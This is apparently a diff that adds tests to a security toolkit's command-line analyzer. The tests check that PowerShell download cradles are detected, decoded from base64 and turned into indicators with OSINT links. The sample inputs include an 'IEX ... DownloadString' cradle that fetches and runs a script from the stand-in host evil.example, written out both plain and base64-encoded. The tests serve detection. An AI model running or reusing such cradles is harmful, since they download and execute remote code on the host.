@@ -838,6 +838,34 @@ async function main() {
       'plain -e must not trigger the encodedcommand rule');
   });
 
+  await test('cmdline: finding carries pivot IOCs with OSINT links', () => {
+    const r = toolkit.analyzeCommandLine("IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')");
+    const cradle = r.matched.find((m) => m.id === 'cradle-combo');
+    assert.ok(cradle, 'cradle must match');
+    assert.ok(cradle.iocs.some((i) => i.value.includes('evil.example')),
+      'URL/domain near the cradle must be attached to the finding: ' + JSON.stringify(cradle.iocs));
+    // The links shown are the same ones the IOC rows use.
+    const links = toolkit.generateOSINTLinks('evil.example', 'domain');
+    assert.ok(links.length >= 3, 'OSINT links must exist for the domain');
+  });
+
+  await test('cmdline: UTF-16LE encoded payload is decoded and analyzed', () => {
+    const payload = 'iex (New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")';
+    const b64 = Buffer.from(payload, 'utf16le').toString('base64');
+    const r = toolkit.analyzeCommandLine('powershell -encodedcommand ' + b64);
+    assert.ok(r.findings.some((f) => /Decoded Base64/i.test(f.title)), 'decoded-payload finding must appear');
+    assert.ok(r.matched.some((m) => m.id === 'cradle-combo'), 'rules must match through the decoded payload');
+    assert.strictEqual(r.verdict, 'malicious');
+    assert.ok(r.iocs.some((i) => i.value.includes('evil.example')), 'decoded IOC must reach the pivot list');
+  });
+
+  await test('cmdline: plain URL input yields indicators with no findings', () => {
+    const r = toolkit.analyzeCommandLine('start http://example.com/page');
+    assert.strictEqual(r.matched.length, 0, 'start + URL is not a finding');
+    assert.strictEqual(r.verdict, 'clean');
+    assert.ok(r.iocs.length >= 1, 'URL must still be offered as a pivot');
+  });
+
   console.log(' [PASS] Command Line Analyzer');
 
   console.log('\nTest Summary:');
